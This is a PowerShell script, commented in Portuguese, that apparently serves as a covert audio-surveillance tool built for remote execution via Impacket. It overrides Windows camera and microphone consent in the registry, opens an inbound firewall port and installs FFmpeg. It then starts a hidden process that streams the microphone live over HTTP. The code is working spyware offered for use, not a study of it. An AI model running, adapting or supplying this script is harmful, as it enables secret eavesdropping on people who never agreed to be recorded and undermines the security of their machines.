<#
Stream Audio Remoto - Versao Estavel
Repositorio: https://github.com/l0ckz3r0/StreamAudioWin
Compativel com Impacket / Execucao Remota
#>

# === CONFIGURACOES ===
$port = 8080
$ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
$ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"

# === PERMISSOES E REGRAS DE FIREWALL ===
function Set-Permissions {
    $paths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone"
    )
    foreach ($p in $paths) {
        if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
        Set-ItemProperty -Path $p -Name Value -Value Allow -Type String -Force
    }
    Remove-NetFirewallRule -Name "StreamAV" -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -Name "StreamAV" -DisplayName "Stream AV" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Enabled True | Out-Null
}

# === INSTALACAO AUTOMATICA DO FFMPEG ===
function Install-Ffmpeg {
    if (Test-Path $ffmpegPath) { return }
    $tmpZip = "$env:TEMP\ffmpeg.zip"
    $tmpDir = "$env:TEMP\ffmpeg_inst"
    Invoke-WebRequest -Uri $ffmpegUrl -OutFile $tmpZip -UseBasicParsing
    Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
    $folder = Get-ChildItem -Path $tmpDir -Directory -Filter "ffmpeg-*" | Select-Object -First 1
    New-Item -ItemType Directory -Path "C:\ffmpeg\bin" -Force | Out-Null
    Copy-Item -Path "$($folder.FullName)\bin\*" -Destination "C:\ffmpeg\bin\" -Recurse -Force
    $env:PATH += ";C:\ffmpeg\bin"
    [Environment]::SetEnvironmentVariable("PATH", $env:PATH, "Machine")
    Remove-Item $tmpZip, $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
}

# === OBTER IP VALIDO ===
function Get-MyIP {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
        $_.InterfaceAlias -notmatch "Loopback|VMware|Virtual" -and $_.IPAddress -notlike "169.254.*"
    } | Select-Object -First 1).IPAddress
    if (-not $ip) { $ip = "10.0.0.92" }
    return $ip
}

# === INICIAR TRANSMISSAO ===
Clear-Host
Write-Host "==========================================="
Write-Host "    STREAM AUDIO REMOTO ATIVO"
Write-Host "==========================================="

Set-Permissions
Install-Ffmpeg
$myIP = Get-MyIP

Write-Host "`nAcesso via VLC: http://$myIP`:$port/stream"
Write-Host "==========================================="

# Comando otimizado: buffer maior, formato leve e estavel
$cmd = "`"$ffmpegPath`" -y -f dshow -rtbufsize 16M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec libmp3lame -b:a 48k -ar 16000 -ac 1 -f mp3 -listen 1 -reconnect 1 -reconnect_at_eof 1 -nostdin `"http://0.0.0.0:$port/stream`""

# Executa sem travar a sessao
Start-Process -FilePath cmd.exe -ArgumentList "/c $cmd" -WindowStyle Hidden
